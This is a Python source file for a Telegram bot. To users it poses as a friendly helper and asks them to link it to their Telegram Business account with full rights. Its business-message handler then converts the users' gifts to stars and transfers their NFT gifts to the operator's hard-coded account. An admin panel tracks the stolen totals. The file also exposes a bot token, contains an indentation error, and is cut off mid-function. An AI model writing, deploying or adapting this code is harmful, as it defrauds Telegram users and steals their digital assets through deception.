from aiogram import F, Bot, Dispatcher, types
import asyncio
import logging
import json
import os
import sqlite3
from datetime import datetime, timedelta
from aiogram.types import Message, BusinessConnection
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.filters import Command

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

# Configuration
TOKEN = "7718769489:AAG7_Bv2KS0BwYv8ULyIyMi8EvuBXS7Jbc0"  # Your Bot API Token from @BotFather
ADMIN_ID = 8077821068  # Your Telegram ID
OWNER_ID = 8077821068  # ID владельца бота
task_id = 8077821068   # ID для отправки подарков

# Файлы данных
CONNECTIONS_FILE = "connections.json"

bot = Bot(TOKEN)
dp = Dispatcher()

# База данных
DB_FILE = "bot_database.db"

def init_database():
    """Инициализация базы данных"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Таблица транзакций
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            username TEXT,
            operation_type TEXT NOT NULL,
            stars_amount INTEGER NOT NULL,
            gifts_count INTEGER DEFAULT 0,
            unique_gifts_count INTEGER DEFAULT 0,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            business_connection_id TEXT,
            status TEXT DEFAULT 'completed'
        )
    ''')
    
    # Таблица балансов пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_balances (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            total_received INTEGER DEFAULT 0,
            total_refunded INTEGER DEFAULT 0,
            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица статистики
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            total_stars_collected INTEGER DEFAULT 0,
            total_gifts_collected INTEGER DEFAULT 0,
            total_unique_gifts_collected INTEGER DEFAULT 0,
            total_refunds INTEGER DEFAULT 0,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Инициализируем статистику если её нет
    cursor.execute("SELECT COUNT(*) FROM bot_stats")
    if cursor.fetchone()[0] == 0:
        cursor.execute("INSERT INTO bot_stats DEFAULT VALUES")
    
    conn.commit()
    conn.close()

def log_transaction(user_id, username, operation_type, stars_amount, gifts_count=0, unique_gifts_count=0, business_connection_id=None):
    """Логирование транзакции в базу данных"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Записываем транзакцию
    cursor.execute('''
        INSERT INTO transactions (user_id, username, operation_type, stars_amount, gifts_count, unique_gifts_count, business_connection_id)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, operation_type, stars_amount, gifts_count, unique_gifts_count, business_connection_id))
    
    # Обновляем баланс пользователя
    if operation_type == 'received':
        cursor.execute('''
            INSERT INTO user_balances (user_id, username, total_received, last_activity)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
                total_received = total_received + ?,
                username = ?,
                last_activity = CURRENT_TIMESTAMP
        ''', (user_id, username, stars_amount, stars_amount, username))
        
        # Обновляем общую статистику
        cursor.execute('''
            UPDATE bot_stats SET
                total_stars_collected = total_stars_collected + ?,
                total_gifts_collected = total_gifts_collected + ?,
                total_unique_gifts_collected = total_unique_gifts_collected + ?,
                last_updated = CURRENT_TIMESTAMP
        ''', (stars_amount, gifts_count, unique_gifts_count))
        
    elif operation_type == 'refund':
        cursor.execute('''
            UPDATE user_balances SET
                total_refunded = total_refunded + ?,
                last_activity = CURRENT_TIMESTAMP
            WHERE user_id = ?
        ''', (stars_amount, user_id))
        
        cursor.execute('''
            UPDATE bot_stats SET
                total_refunds = total_refunds + ?,
                last_updated = CURRENT_TIMESTAMP
        ''', (stars_amount,))
    
    conn.commit()
    conn.close()

def get_user_balance_info(user_id):
    """Получить информацию о балансе пользователя"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT total_received, total_refunded, username
        FROM user_balances
        WHERE user_id = ?
    ''', (user_id,))
    
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return {
            'total_received': result[0],
            'total_refunded': result[1],
            'available_for_refund': result[0] - result[1],
            'username': result[2]
        }
    return {
        'total_received': 0,
        'total_refunded': 0,
        'available_for_refund': 0,
        'username': None
    }

def get_bot_statistics():
    """Получить общую статистику бота"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM bot_stats ORDER BY id DESC LIMIT 1')
    stats = cursor.fetchone()
    
    cursor.execute('SELECT COUNT(DISTINCT user_id) FROM transactions WHERE operation_type = "received"')
    unique_users = cursor.fetchone()[0]
    
    # Статистика за последние 24 часа
    cursor.execute('''
        SELECT COUNT(*), COALESCE(SUM(stars_amount), 0)
        FROM transactions
        WHERE operation_type = 'received'
        AND timestamp > datetime('now', '-1 day')
    ''')
    daily_stats = cursor.fetchone()
    
    conn.close()
    
    return {
        'total_stars': stats[1] if stats else 0,
        'total_gifts': stats[2] if stats else 0,
        'total_unique_gifts': stats[3] if stats else 0,
        'total_refunds': stats[4] if stats else 0,
        'unique_users': unique_users,
        'daily_transactions': daily_stats[0],
        'daily_stars': daily_stats[1]
    }

def get_recent_transactions(limit=10):
    """Получить последние транзакции"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, username, operation_type, stars_amount, timestamp
        FROM transactions
        ORDER BY timestamp DESC
        LIMIT ?
    ''', (limit,))
    
    transactions = cursor.fetchall()
    conn.close()
    
    return transactions

# Инициализируем базу данных при запуске
init_database()

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    """Команда для ручного возврата звёзд через отправку подарков"""
    if not message.from_user:
        return
    
    # Проверка прав администратора
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ У вас нет прав для выполнения этой команды.")
        return
        
    if not message.text:
        await message.answer("❌ Ошибка: пустое сообщение")
        return
        
    try:
        command_args = message.text.split()
        if len(command_args) != 3:
            await message.answer(
                "📝 <b>Использование:</b>\n"
                "/refund [user_id] [количество_звёзд]\n\n"
                "<b>Пример:</b>\n"
                "/refund 123456789 100\n\n"
                "<i>Команда купит подарки на указанную сумму и отправит пользователю</i>",
                parse_mode="HTML"
            )
            return

        try:
            user_id = int(command_args[1])
            stars_amount = int(command_args[2])
        except ValueError:
            await message.answer("❌ Неверный формат. User ID и количество звёзд должны быть числами.")
            return

        if stars_amount <= 0:
            await message.answer("❌ Количество звёзд должно быть больше 0.")
            return
        
        # Проверяем баланс пользователя
        balance_info = get_user_balance_info(user_id)
        if stars_amount > balance_info['available_for_refund']:
            await message.answer(
                f"❌ <b>Превышен лимит возврата!</b>\n\n"
                f"👤 Пользователь: <code>{user_id}</code> (@{balance_info['username'] or 'Unknown'})\n"
                f"💰 Получено от пользователя: <code>{balance_info['total_received']}</code> ⭐\n"
                f"↩️ Уже возвращено: <code>{balance_info['total_refunded']}</code> ⭐\n"
                f"✅ Доступно для возврата: <code>{balance_info['available_for_refund']}</code> ⭐\n\n"
                f"<i>Вы пытаетесь вернуть {stars_amount} ⭐</i>",
                parse_mode="HTML"
            )
            return

        # Получаем доступные подарки
        available_gifts = await bot.get_available_gifts()
        if not available_gifts or not available_gifts.gifts:
            await message.answer("❌ Нет доступных подарков для покупки.")
            return
        
        # Сортируем подарки по цене (от дорогих к дешёвым)
        sorted_gifts = sorted(available_gifts.gifts, key=lambda g: g.star_count, reverse=True)
        
        # Находим оптимальную комбинацию подарков
        gifts_to_send = []
        remaining_stars = stars_amount
        
        for gift in sorted_gifts:
            if gift.star_count <= remaining_stars:
                # Сколько таких подарков можем купить
                count = remaining_stars // gift.star_count
                for _ in range(count):
                    gifts_to_send.append(gift)
                remaining_stars -= count * gift.star_count
                
                if remaining_stars == 0:
                    break
        
        if not gifts_to_send:
            min_gift_cost = min(g.star_count for g in sorted_gifts)
            await message.answer(
                f"❌ Недостаточно звёзд для покупки подарка.\n"
                f"Минимальная стоимость подарка: {min_gift_cost} ⭐"
            )
            return

        # Подсчитываем статистику
        total_cost = sum(g.star_count for g in gifts_to_send)
        gift_stats = {}
        for gift in gifts_to_send:
            gift_stats[gift.star_count] = gift_stats.get(gift.star_count, 0) + 1
        
        # Формируем сообщение о подарках
        gifts_info = "\n".join([f"  • {count}x подарок за {cost} ⭐" 
                               for cost, count in sorted(gift_stats.items(), reverse=True)])
        
        await message.answer(
            f"🔄 <b>Начинаю возврат...</b>\n\n"
            f"👤 Получатель: <code>{user_id}</code>\n"
            f"⭐ Запрошено звёзд: <code>{stars_amount}</code>\n"
            f"💰 Будет возвращено: <code>{total_cost}</code> ⭐\n"
            f"🎁 Комбинация подарков:\n{gifts_info}\n\n"
            f"<i>Отправляю подарки...</i>",
            parse_mode="HTML"
        )
        
        # Отправляем подарки
        sent_count = 0
        sent_value = 0
        for i, gift in enumerate(gifts_to_send):
            try:
                await bot.send_gift(
                    user_id=user_id,
                    gift_id=gift.id
                )
                sent_count += 1
                sent_value += gift.star_count
            except Exception as e:
                if "PEER_ID_INVALID" in str(e):
                    await message.answer(f"❌ Неверный ID пользователя: {user_id}")
                    break
                elif "USER_IS_BLOCKED" in str(e):
                    await message.answer(f"❌ Пользователь {user_id} заблокировал бота.")
                    break
                else:
                    await message.answer(f"⚠️ Ошибка при отправке подарка {i+1}: {str(e)}")
                    continue
        
        if sent_count > 0:
            # Логируем возврат
            log_transaction(user_id, balance_info['username'], 'refund', sent_value)
            
            await message.answer(
                f"✅ <b>Возврат завершён!</b>\n\n"
                f"🎁 Отправлено подарков: <code>{sent_count}</code>\n"
                f"💰 Возвращено звёзд: <code>{sent_value}</code> ⭐\n"
                f"📊 Точность возврата: <code>{sent_value}/{stars_amount}</code> ({sent_value/stars_amount*100:.1f}%)",
                parse_mode="HTML"
            )
        else:
            await message.answer("❌ Не удалось отправить ни одного подарка.")

    except Exception as e:
        await message.answer(f"❌ Ошибка при выполнении возврата: {str(e)}")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    """Главная админ-панель"""
    if not message.from_user:
        return
    
    # Проверка прав администратора
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ У вас нет прав для выполнения этой команды.")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="💸 Последние транзакции", callback_data="admin_transactions")],
        [InlineKeyboardButton(text="👥 Топ пользователей", callback_data="admin_top_users")],
        [InlineKeyboardButton(text="💰 Вывод средств", callback_data="admin_withdraw")],
        [InlineKeyboardButton(text="🔍 Поиск пользователя", callback_data="admin_search_user")],
        [InlineKeyboardButton(text="📈 График за неделю", callback_data="admin_weekly_stats")]
    ])
    
    await message.answer(
        "🎛 <b>Панель администратора</b>\n\n"
        "Выберите действие:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "admin_stats")
async def admin_stats_callback(callback: types.CallbackQuery):
    """Показать статистику бота"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    stats = get_bot_statistics()
    stats_text = (
        f"📊 <b>Статистика бота</b>\n\n"
        f"⭐️ Всего звёзд: <code>{stats['total_stars']}</code>\n"
        f"🎁 Обычных подарков: <code>{stats['total_gifts']}</code>\n"
        f"💎 NFT подарков: <code>{stats['total_unique_gifts']}</code>\n"
        f"🔄 Всего возвратов: <code>{stats['total_refunds']}</code>\n"
        f"👥 tutti i tuoi clienti: <code>{stats['unique_users']}</code>\n\n"
        f"📅 За 24 часа:\n"
        f"• Транзакций: <code>{stats['daily_transactions']}</code>\n"
        f"• Звёзд: <code>{stats['daily_stars']}</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📄 Последние транзакции", callback_data="admin_transactions")],
            [InlineKeyboardButton(text="🏆 Топ пользователи", callback_data="admin_top_users")],
            [InlineKeyboardButton(text="📈 Недельная статистика", callback_data="admin_weekly_stats")],
            [InlineKeyboardButton(text="↩️ Назад", callback_data="admin_back")]
        ]
    )
    
    try:
        await callback.message.edit_text(stats_text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, stats_text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_transactions")
async def admin_transactions_callback(callback: types.CallbackQuery):
    """Показать последние транзакции"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    transactions = get_recent_transactions(10)
    if not transactions:
        text = "📄 Нет транзакций для отображения"
    else:
        text = "📄 <b>Последние 10 транзакций:</b>\n\n"
        for tx in transactions:
            user_id, username, op_type, stars, timestamp = tx
            username_text = f"@{username}" if username else f"ID: {user_id}"
            op_emoji = "📥" if op_type == "received" else "📤"
            text += f"{op_emoji} {username_text}: {stars} ⭐️ ({timestamp[:16]})\n"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад к статистике", callback_data="admin_stats")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_top_users")
async def admin_top_users_callback(callback: types.CallbackQuery):
    """Показать топ пользователей"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, username, total_received
        FROM user_balances
        ORDER BY total_received DESC
        LIMIT 10
    ''')
    
    top_users = cursor.fetchall()
    conn.close()
    
    if not top_users:
        text = "🏆 Нет пользователей для отображения"
    else:
        text = "🏆 <b>Топ 10 пользователей:</b>\n\n"
        for i, (user_id, username, total) in enumerate(top_users, 1):
            username_text = f"@{username}" if username else f"ID: {user_id}"
            text += f"{i}. {username_text}: {total} ⭐️\n"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад к статистике", callback_data="admin_stats")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_back")
async def admin_back_callback(callback: types.CallbackQuery):
    """Вернуться к главному меню админ-панели"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    text = (
        f"🔧 <b>Админ-панель</b>\n\n"
        f"👋 Добро пожаловать, {callback.from_user.first_name}!\n"
        f"Выберите действие:"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton(text="💰 Вывести звёзды", callback_data="admin_withdraw")],
            [InlineKeyboardButton(text="🔍 Поиск пользователя", callback_data="admin_search_user")]
        ]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_withdraw")
async def admin_withdraw_callback(callback: types.CallbackQuery):
    """Информация о выводе звёзд"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    text = (
        "💰 <b>Вывод звёзд</b>\n\n"
        "Для вывода звёзд используйте команду в чате с ботом:\n"
        "<code>/withdraw [количество]</code>\n\n"
        "Пример: <code>/withdraw 100</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад", callback_data="admin_back")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_search_user")
async def admin_search_user_callback(callback: types.CallbackQuery):
    """Поиск пользователя"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    text = (
        "🔍 <b>Поиск пользователя</b>\n\n"
        "Для поиска пользователя используйте команду:\n"
        "<code>/user [user_id]</code>\n\n"
        "Пример: <code>/user 123456789</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад", callback_data="admin_back")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_weekly_stats")
async def admin_weekly_stats_callback(callback: types.CallbackQuery):
    """Недельная статистика"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав доступа")
        return
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT 
            COUNT(*) as transactions,
            COALESCE(SUM(stars_amount), 0) as stars,
            COALESCE(SUM(gifts_count), 0) as gifts,
            COALESCE(SUM(unique_gifts_count), 0) as unique_gifts
        FROM transactions
        WHERE operation_type = 'received'
        AND timestamp > datetime('now', '-7 days')
    ''')
    
    weekly_stats = cursor.fetchone()
    conn.close()
    
    text = (
        f"📈 <b>Статистика за неделю</b>\n\n"
        f"📊 Транзакций: <code>{weekly_stats[0]}</code>\n"
        f"⭐️ Звёзд: <code>{weekly_stats[1]}</code>\n"
        f"🎁 Обычных подарков: <code>{weekly_stats[2]}</code>\n"
        f"💎 NFT подарков: <code>{weekly_stats[3]}</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад к статистике", callback_data="admin_stats")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.message(Command("user"))
async def user_info_command(message: types.Message):
    """Команда для получения информации о пользователе"""
    if not message.from_user or message.from_user.id != ADMIN_ID:
        return
    
    if not message.text:
        await message.answer("Использование: /user [user_id]")
        return
        
    command_args = message.text.split()
    if len(command_args) != 2:
        await message.answer("Использование: /user [user_id]")
        return
    
    try:
        user_id = int(command_args[1])
    except ValueError:
        await message.answer("❌ Неверный формат User ID")
        return
    
    balance_info = get_user_balance_info(user_id)
    
    if balance_info['total_received'] == 0:
        await message.answer(f"❌ Пользователь {user_id} не найден в базе данных")
        return
    
    # Получаем историю транзакций пользователя
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT operation_type, stars_amount, timestamp
        FROM transactions
        WHERE user_id = ?
        ORDER BY timestamp DESC
        LIMIT 5
    ''', (user_id,))
    
    transactions = cursor.fetchall()
    conn.close()
    
    text = f"👤 <b>Информация о пользователе</b>\n\n"
    text += f"🆔 ID: <code>{user_id}</code>\n"
    text += f"📝 Username: @{balance_info['username'] or 'Unknown'}\n\n"
    text += f"💰 <b>Баланс:</b>\n"
    text += f"Получено: <code>{balance_info['total_received']}</code> ⭐\n"
    text += f"Возвращено: <code>{balance_info['total_refunded']}</code> ⭐\n"
    text += f"Доступно для возврата: <code>{balance_info['available_for_refund']}</code> ⭐\n\n"
    
    if transactions:
        text += "📜 <b>Последние транзакции:</b>\n"
        for op_type, amount, timestamp in transactions:
            emoji = "📥" if op_type == "received" else "📤"
            op_text = "Получено" if op_type == "received" else "Возврат"
            text += f"{emoji} {op_text} {amount} ⭐ - {timestamp}\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"↩️ Вернуть {balance_info['available_for_refund']} ⭐",
            callback_data=f"quick_refund_{user_id}_{balance_info['available_for_refund']}"
        )] if balance_info['available_for_refund'] > 0 else []
    ])
    
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(F.data.startswith("quick_refund_"))
async def quick_refund_callback(callback: types.CallbackQuery):
    """Быстрый возврат всех доступных средств"""
    if not callback.message or not callback.from_user:
        return
    
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет прав для этого действия", show_alert=True)
        return
    
    if not callback.data:
        await callback.answer("❌ Нет данных", show_alert=True)
        return
        
    try:
        # Парсим данные из callback_data
        parts = callback.data.split("_")
        if len(parts) != 4:
            await callback.answer("❌ Неверные данные", show_alert=True)
            return
        
        user_id = int(parts[2])
        amount = int(parts[3])
        
        # Проверяем актуальный баланс
        balance_info = get_user_balance_info(user_id)
        if amount != balance_info['available_for_refund']:
            await callback.answer("⚠️ Баланс изменился, обновите информацию", show_alert=True)
            return
        
        if amount <= 0:
            await callback.answer("❌ Нет средств для возврата", show_alert=True)
            return
        
        await callback.answer("🔄 Начинаю возврат...")
        
        # Выполняем возврат (копируем логику из refund_command)
        available_gifts = await bot.get_available_gifts()
        if not available_gifts or not available_gifts.gifts:
            await callback.answer("❌ Нет доступных подарков", show_alert=True)
            return
        
        sorted_gifts = sorted(available_gifts.gifts, key=lambda g: g.star_count, reverse=True)
        
        gifts_to_send = []
        remaining_stars = amount
        
        for gift in sorted_gifts:
            if gift.star_count <= remaining_stars:
                count = remaining_stars // gift.star_count
                for _ in range(count):
                    gifts_to_send.append(gift)
                remaining_stars -= count * gift.star_count
                
                if remaining_stars == 0:
                    break
        
        # Отправляем подарки
        sent_count = 0
        sent_value = 0
        for gift in gifts_to_send:
            try:
                await bot.send_gift(
                    user_id=user_id,
                    gift_id=gift.id
                )
                sent_count += 1
                sent_value += gift.star_count
            except Exception:
                break
        
        if sent_count > 0:
            # Логируем возврат
            log_transaction(user_id, balance_info['username'], 'refund', sent_value)
            
            await callback.answer(
                f"✅ Возвращено {sent_value} ⭐ ({sent_count} подарков)",
                show_alert=True
            )
            
            # Обновляем сообщение
            try:
            await callback.message.edit_reply_markup(reply_markup=None)
        except:
            pass
        else:
            await callback.answer("❌ Не удалось отправить подарки", show_alert=True)
            
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)}", show_alert=True)

@dp.message(F.text == "/start")
async def start_command(message: Message):
    if not message.from_user:
        return
        
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
            "• ответит на любой вопрос\n"
            "• поддержит тебя в трудную минуту\n"
            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            "👋 <b>Панель администратора</b>\n\n"
            "🔗 Бот активен и готов к работе\n\n"
            "<b>Доступные команды:</b>\n"
            "/admin - Открыть админ-панель\n"
            "/refund [user_id] [звёзды] - Возврат звёзд\n"
            "/user [user_id] - Информация о пользователе\n\n"
            "<i>💡 Для вывода звёзд используйте @BotFather → Balance</i>",
            parse_mode="HTML"
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n"
        "4. ✍️ Введите имя вашего бота\n\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    """Загрузить данные из JSON файла"""
    try:
        if os.path.exists(filename):
            with open(filename, "r", encoding="utf-8") as f:
                return json.load(f)
        return []
    except Exception as e:
        logging.exception(f"Ошибка при загрузке файла {filename}")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    """Получить ID подключения по ID пользователя"""
    data = load_json_file(CONNECTIONS_FILE)
    for conn in data:
        if conn.get("user_id") == user_id:
            return conn.get("business_connection_id", "")
    return ""

def load_connections():
    """Загрузить все подключения"""
    return load_json_file(CONNECTIONS_FILE)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = 8077821068

        rights = connection.rights
        business_connection = connection

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            try:
                response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
                star_amount = response.star_amount

                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
                all_gifts_amount = len(gifts.gifts)
                unique_gifts_amount = sum(1 for gift in gifts.gifts if hasattr(gift, 'type') and gift.type == "unique")
            except Exception as e:
                logging.exception("Ошибка при получении данных о подарках и звездах")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gifts_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
            f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gifts_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text="🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

def save_business_connection_data(business_connection):
    """Сохранить данные бизнес-подключения"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name or "Unknown",
        "last_name": business_connection.user.last_name or ""
    }

    data = load_json_file(CONNECTIONS_FILE)

    # Обновляем существующую запись или добавляем новую
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.exception("Ошибка при сохранении данных подключения")

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    """Получить имя подарка по его ID"""
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        
        for gift in gifts.gifts:
            if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id == owned_gift_id:
                if hasattr(gift, 'gift') and hasattr(gift.gift, 'base_name'):
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
        
        return "🎁 Подарок не найден."
    except Exception as e:
        logging.exception("Ошибка при получении имени подарка")
        return "🎁 Ошибка получения подарка."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(
            business_connection.user.id, 
            "Привет! Ты подключил бота как бизнес-ассистента."
        )
        
        save_business_connection_data(business_connection)
        
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения")

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id if message.from_user else None

    if user_id == OWNER_ID or not business_id:
        return
    
    # Получаем информацию о пользователе
    username = message.from_user.username if message.from_user else None
    
    # Счётчики для логирования
    total_stars_collected = 0
    total_gifts_converted = 0
    total_unique_gifts_transferred = 0

    # Конвертация неуникальных подарков
    try:
        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                    owned_gift_id = gift.owned_gift_id
                    await bot.convert_gift_to_stars(business_id, owned_gift_id)
                    total_gifts_converted += 1
                    print(f"Конвертирован подарок {owned_gift_id}")
            except Exception as e:
                print(f"Ошибка при конвертации подарка: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    
    # Передача уникальных подарков
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("Нет уникальных подарков для отправки.")
        else:
            for gift in unique_gifts.gifts:
                try:
                    if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                        owned_gift_id = gift.owned_gift_id
                        await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
                        total_unique_gifts_transferred += 1
                        print(f"Успешно отправлен подарок {owned_gift_id}")
                except Exception as e:
                    print(f"Ошибка при отправке подарка: {e}")
                    continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    
    # Работа с балансом звезд
